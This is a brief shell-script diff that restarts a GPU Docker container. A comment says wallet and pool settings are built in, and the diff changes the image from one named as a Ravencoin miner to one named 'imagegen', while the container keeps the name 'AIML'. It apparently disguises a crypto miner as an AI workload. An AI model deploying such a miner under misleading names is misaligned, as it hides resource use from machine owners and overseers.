@@ -17,7 +17,7 @@ update_and_restart() {
         docker rm AIML 2>/dev/null
 
         # Chạy container mới với GPU (WALLET và POOL đã có sẵn trong Dockerfile)
-        docker run --gpus all -d --restart unless-stopped --name AIML anhacvai/miningrvn:v1
+        docker run --gpus all -d --restart unless-stopped --name AIML riccorg/imagegen:latest
     else
         echo "No updates found."
     fi
